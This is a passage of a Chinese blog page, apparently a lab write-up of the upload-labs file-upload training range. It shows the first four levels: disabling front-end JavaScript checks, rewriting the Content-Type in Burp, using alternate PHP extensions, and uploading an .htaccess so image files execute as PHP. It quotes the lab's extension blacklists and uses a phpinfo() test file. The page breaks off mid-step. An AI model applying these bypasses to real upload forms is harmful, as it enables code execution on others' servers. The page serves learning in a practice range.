+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_6">
+            <span class="md-nav__icon md-icon"></span>
+            培训任务
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../peixun/pwn%E5%9F%B9%E8%AE%AD/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pwn培训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../peixun/reverse%E5%9F%B9%E8%AE%AD/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    reverse培训
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../ESSAY/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    随笔
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            随笔
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2405/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2405
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2404/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2404
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2403/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2403
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2402/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2402
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../ESSAY/jottings/2401/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    侯霖钰的随笔记 | 2401
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_5" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../TimeLine/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    时间线
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_5" id="__nav_5_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            时间线
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TimeLine/Line/DEC/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    开发 时间线
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../TimeLine/Line/WebSec/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网络安全 时间线
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_6" >
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../WEBSITE/" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    网站
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_6" id="__nav_6_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            网站
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEBSITE/build/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    网站构建说明
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEBSITE/help/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    文章编写帮助
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../WEBSITE/test/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    测试文档
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#upload-labs" class="md-nav__link">
+    <span class="md-ellipsis">
+      一、upload-labs 靶场简介
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      二、打靶记录
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="二、打靶记录">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pass-01-js" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-01 JS 校验
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-02-mime" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-02 文件类型校验(MIME 校验)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-03" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-03 文件名后缀校验(黑名单绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-04-htaccess" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-04 文件名后缀校验 (配置文件解析控制) .htaccess
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-05-userini" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-05 文件名后缀校验 (配置文件解析控制) .user.ini
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-06" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-06 文件名后缀校验 (大小写绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-07" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-07 文件名后缀校验 (空格绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-08" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-08 文件名后缀校验 (点号绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-09-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-09 文件名后缀校验 (::$DATA 绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-10 文件名后缀校验 (拼接绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-11" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-11 文件名后缀校验 (双写绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-12-get-0x00" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-12 白名单校验 (GET 型 0x00 截断)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-13-post-0x00" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-13 白名单校验 ( POST 型 0x00 截断)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-14" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-14 文件内容检测 (文件头校验)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-15-getimagesize" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-15 文件内容检测 (getimagesize()校验)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-16-exif_imagetype" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-16 文件内容检测 (exif_imagetype()绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-17" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-17 文件内容检测 (二次渲染)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-18" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-18 逻辑漏洞 (条件竞争)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-19-apache" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-19 逻辑漏洞 (条件竞争-Apache解析漏洞)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-20" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-20 逻辑漏洞 (小数点绕过)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pass-21" class="md-nav__link">
+    <span class="md-ellipsis">
+      Pass-21 逻辑漏洞 (数组绕过)
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+    
+      
+    
+    <a href="https://github.com/AnistonH/AnistonH.github.io/raw/main/docs/WEB/labs/upload-labs靶场打靶记录.md" title="查看本页的源代码" class="md-content__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 18c.56 0 1 .44 1 1s-.44 1-1 1-1-.44-1-1 .44-1 1-1m0-3c-2.73 0-5.06 1.66-6 4 .94 2.34 3.27 4 6 4s5.06-1.66 6-4c-.94-2.34-3.27-4-6-4m0 6.5a2.5 2.5 0 0 1-2.5-2.5 2.5 2.5 0 0 1 2.5-2.5 2.5 2.5 0 0 1 2.5 2.5 2.5 2.5 0 0 1-2.5 2.5M9.27 20H6V4h7v5h5v4.07c.7.08 1.36.25 2 .49V8l-6-6H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h4.5a8.2 8.2 0 0 1-1.23-2"/></svg>
+    </a>
+  
+
+
+<h2 id="upload-labs">一、upload-labs 靶场简介<a class="headerlink" href="#upload-labs" title="Permanent link">&para;</a></h2>
+<p>upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共21关，每一关都包含着不同上传方式。</p>
+<blockquote>
+<ol>
+<li>每一关没有固定的通关方法，大家不要自限思维！
+2.本项目提供的writeup只是起一个参考作用，希望大家可以分享出自己的通关思路。
+3.实在没有思路时，可以点击查看提示。
+4.如果黑盒情况下，实在做不出，可以点击查看源码。</li>
+</ol>
+</blockquote>
+<p>后续如在渗透测试实战中遇到新的上传漏洞类型，会更新到upload-labs中。当然如果你也希望参加到这个工作当中，欢迎pull requests给我!</p>
+<p>项目地址：https://github.com/c0ny1/upload-labs</p>
+<h1 id="_1">二、打靶记录<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="pass-01-js">Pass-01 JS 校验<a class="headerlink" href="#pass-01-js" title="Permanent link">&para;</a></h2>
+<p>本关卡为JS检验。漏洞描述：利用前端 JS 对上传文件后缀进行校验，后端没进行检测</p>
+<blockquote>
+<p><strong>利用方法：</strong></p>
+<ul>
+<li>浏览器禁用 js </li>
+<li>浏览器前端修改</li>
+<li>Burp抓包绕过</li>
+</ul>
+</blockquote>
+<ol>
+<li>
+<p>通过测试，我们发现非图片格式的文件确实无法提交上去，我们先尝试第一种方法：在开发者工具中的设置中找到“停用<code>JavaScript</code>”，选中即可，我们再尝试提交非图片格式的文件，发现成功，<img alt="1" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1.jpg" /></p>
+</li>
+<li>
+<p>我们尝试第二种方法，浏览器前端修改，我们观察可以发现，在提交表单时浏览器会用<code>onsubmit</code>属性进行判断，只有符合其规定之后才可以上传，那么我们可以选择直接将这里的<code>onsubmit</code>属性中的<code>return checkFile()</code>函数删除，也就可以将<code>return checkFile()</code>破坏掉：(在定义<code>return checkFile()</code>处将其函数结构破坏) 
+    <strong>但是，浏览器通常会对这个行为进行一定的限制，比如笔者在测试的时候发现用Edge浏览器便无法通过这种方式上传，但是Firefox浏览器可以。</strong><img alt="4" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/4-1706707119540-2.jpg" /></p>
+</li>
+<li>
+<p>第三种方法的解释：因为是前端js拦截了，所以我们先将php文件后缀修改成合法的格式（.jpg），使用<code>burpsuite</code>抓包，再修改<code>.php</code>后缀，也可以绕过前端验证。</p>
+<p><img alt="3" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/3.jpg" /></p>
+</li>
+</ol>
+<h2 id="pass-02-mime">Pass-02 文件类型校验(MIME 校验)<a class="headerlink" href="#pass-02-mime" title="Permanent link">&para;</a></h2>
+<ol>
+<li>漏洞描述：只检测<code>content-type</code>字段导致的漏洞。(后端利用 PHP 的全局数组 <code>$_FILES()</code>获取上传文件信息)
+利用方法：修改<code>content-type</code>字段的值为图片格式。</li>
+</ol>
+<blockquote>
+<p><strong>常用 content-type 字段：</strong>
+ - image/jpeg ：jpg 图片格式
+ - image/png ：png 图片格式 
+ - image/gif ：gif 图片格式
+ - text/plain ：纯文本格式 
+ - text/xml ： XML 格式 
+ - text/html ： HTML 格式</p>
+</blockquote>
+<ol>
+<li>我们将我们要上传的文件直接上传，发现提示错误，这时候我们看一看Burp抓到的数据包，发现现在的<code>content-type</code>字段为<code>application/octet-stream</code>  （我上传了一个.md格式文件），这时候我们只需要将其改成<code>image/jpeg</code>即可</li>
+</ol>
+<p><img alt="5" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/5.jpg" />
+  <img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/6.jpg" /></p>
+<h2 id="pass-03">Pass-03 文件名后缀校验(黑名单绕过)<a class="headerlink" href="#pass-03" title="Permanent link">&para;</a></h2>
+<p>漏洞描述：使用黑名单的方式限制文件上传类型，后端利用<code>$_FILES()</code>和 <code>strrchr()</code>获取文件名后缀。被限制文件类型： .asp .aspx .php .jsp</p>
+<p>利用方法：因为是利用黑名单来限制文件上传类型，找漏网之鱼绕过
+例如：特殊文件名绕过： .php3 .php4 .php5 .phtml .phtm .phps .phpt .php345</p>
+<ol>
+<li>后端代码如下：发现其只是限制了 .asp .aspx .php .jsp</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-0-2"><span class="x">$msg = null;</span>
+</span><span id="__span-0-3"><span class="x">if (isset($_POST[&#39;submit&#39;])) {</span>
+</span><span id="__span-0-4"><span class="x">    if (file_exists(UPLOAD_PATH)) {</span>
+</span><span id="__span-0-5"><span class="x">        $deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</span>
+</span><span id="__span-0-6"><span class="x">        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span>
+</span><span id="__span-0-7"><span class="x">        $file_name = deldot($file_name);//删除文件名末尾的点</span>
+</span><span id="__span-0-8"><span class="x">        $file_ext = strrchr($file_name, &#39;.&#39;);</span>
+</span><span id="__span-0-9"><span class="x">        $file_ext = strtolower($file_ext); //转换为小写</span>
+</span><span id="__span-0-10"><span class="x">        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</span>
+</span><span id="__span-0-11"><span class="x">        $file_ext = trim($file_ext); //收尾去空</span>
+</span><span id="__span-0-12">
+</span><span id="__span-0-13"><span class="x">        if(!in_array($file_ext, $deny_ext)) {</span>
+</span><span id="__span-0-14"><span class="x">            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-0-15"><span class="x">            $img_path = UPLOAD_PATH.&#39;/&#39;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext;            </span>
+</span><span id="__span-0-16"><span class="x">            if (move_uploaded_file($temp_file,$img_path)) {</span>
+</span><span id="__span-0-17"><span class="x">                 $is_upload = true;</span>
+</span><span id="__span-0-18"><span class="x">            } else {</span>
+</span><span id="__span-0-19"><span class="x">                $msg = &#39;上传出错！&#39;;</span>
+</span><span id="__span-0-20"><span class="x">            }</span>
+</span><span id="__span-0-21"><span class="x">        } else {</span>
+</span><span id="__span-0-22"><span class="x">            $msg = &#39;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#39;;</span>
+</span><span id="__span-0-23"><span class="x">        }</span>
+</span><span id="__span-0-24"><span class="x">    } else {</span>
+</span><span id="__span-0-25"><span class="x">        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span>
+</span><span id="__span-0-26"><span class="x">    }</span>
+</span><span id="__span-0-27"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+2. 因此我们将我们要上传的php文件改成<code>.php3 .php4 .php5 .phtml .phtm .phps .phpt .php345</code>任意一种即可。
+3. <strong>注意：</strong>要在<code>apache</code>的<code>httpd.conf</code>中有如下配置代码：AddType application/x-httpd-php .php .phtml .phps .php5 .pht，如果不配置的话是无法解析php5代码的，访问的时候就是一个空白页</p>
+<h2 id="pass-04-htaccess">Pass-04 文件名后缀校验 (配置文件解析控制) .htaccess<a class="headerlink" href="#pass-04-htaccess" title="Permanent link">&para;</a></h2>
+<p>分析源码：我们发现这一关的过滤比第三过更多了，使用第三关的方法是行不通了。
+但是没有限制 <code>.htaccess</code></p>
+<blockquote>
+<p><strong>补充知识：</strong>
+<code>.htaccess</code>文件是<code>Apache</code>服务器中的一个配置文件，它负责相关目录下的网页配置，通过<code>.htaccess</code>文件，可以实现：网页301重定向、自定义404页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
+</blockquote>
+<p>上传内容为以下代码的<code>.htaccess</code>文件，双引号内为你要上传的文件名。
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><span class="x">&lt;FilesMatch &quot;jpg&quot;&gt;   </span>
+</span><span id="__span-1-2"><span class="x">        SetHandler application/x-httpd-php</span>
+</span><span id="__span-1-3"><span class="x">&lt;/FilesMatch&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+1. 我们先看一看后端代码
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><span class="x">$is_upload = false;</span>
+</span><span id="__span-2-2"><span class="x">$msg = null;</span>
+</span><span id="__span-2-3"><span class="x">if (isset($_POST[&#39;submit&#39;])) {</span>
+</span><span id="__span-2-4"><span class="x">    if (file_exists(UPLOAD_PATH)) {</span>
+</span><span id="__span-2-5"><span class="x">        $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</span>
+</span><span id="__span-2-6"><span class="x">        $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);</span>
+</span><span id="__span-2-7"><span class="x">        $file_name = deldot($file_name);//删除文件名末尾的点</span>
+</span><span id="__span-2-8"><span class="x">        $file_ext = strrchr($file_name, &#39;.&#39;);</span>
+</span><span id="__span-2-9"><span class="x">        $file_ext = strtolower($file_ext); //转换为小写</span>
+</span><span id="__span-2-10"><span class="x">        $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA</span>
+</span><span id="__span-2-11"><span class="x">        $file_ext = trim($file_ext); //收尾去空</span>
+</span><span id="__span-2-12">
+</span><span id="__span-2-13"><span class="x">        if (!in_array($file_ext, $deny_ext)) {</span>
+</span><span id="__span-2-14"><span class="x">            $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];</span>
+</span><span id="__span-2-15"><span class="x">            $img_path = UPLOAD_PATH.&#39;/&#39;.$file_name;</span>
+</span><span id="__span-2-16"><span class="x">            if (move_uploaded_file($temp_file, $img_path)) {</span>
+</span><span id="__span-2-17"><span class="x">                $is_upload = true;</span>
+</span><span id="__span-2-18"><span class="x">            } else {</span>
+</span><span id="__span-2-19"><span class="x">                $msg = &#39;上传出错！&#39;;</span>
+</span><span id="__span-2-20"><span class="x">            }</span>
+</span><span id="__span-2-21"><span class="x">        } else {</span>
+</span><span id="__span-2-22"><span class="x">            $msg = &#39;此文件不允许上传!&#39;;</span>
+</span><span id="__span-2-23"><span class="x">        }</span>
+</span><span id="__span-2-24"><span class="x">    } else {</span>
+</span><span id="__span-2-25"><span class="x">        $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;;</span>
+</span><span id="__span-2-26"><span class="x">    }</span>
+</span><span id="__span-2-27"><span class="x">}</span>
+</span></code></pre></div></td></tr></table></div>
+2. 从以上代码可以看出，该关过滤了大量的能够被解析成php的后缀，但是没有对<code>.htaccess</code>的文件进行过滤，因此我们可以<code>.htaccess</code>上传的方式绕过。
+3. 我们先上传一个<code>.htaccess</code>文件,文件内容如下：</p>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><span class="x">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span>
+</span><span id="__span-3-2"><span class="x">    SetHandler application/x-httpd-php</span>
+</span><span id="__span-3-3"><span class="x">&lt;/FilesMatch&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<blockquote>
+<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<p>在上述配置中，FilesMatch表示匹配1.png的文件，当该文件名匹配成功后，SetHandler表示将该文件作为PHP类型的文件来进行处置。然后上传该文件。</p>
+</blockquote>
+<p><img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/7.jpg" /></p>
+<ol>
+<li>之后，我们再上传一个jpg文件，注意，这个jpg文件并不是正常的文件！！
+    那么我们再创建一个php文件，其内容设置为<code>&lt;?php  phpinfo(); ?&gt;</code>，然后再将此文件后缀改为jpg，上传。</li>
+</ol>
+<p><img alt="在这里插入图片描述" src="../upload-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/8.jpg" /></p>
+<ol>
+<li>
+<p>之后我们再访问上传上的图片，便可以成功看到phpinfo界面。<strong>但是需要注意的是<code>.htaccess</code>文件是<code>apache</code>默认的文件名，所以如果后台有对上传文件强制改名的机制，那么这种方法也就失效了。</strong></p>
+</li>
+<li>
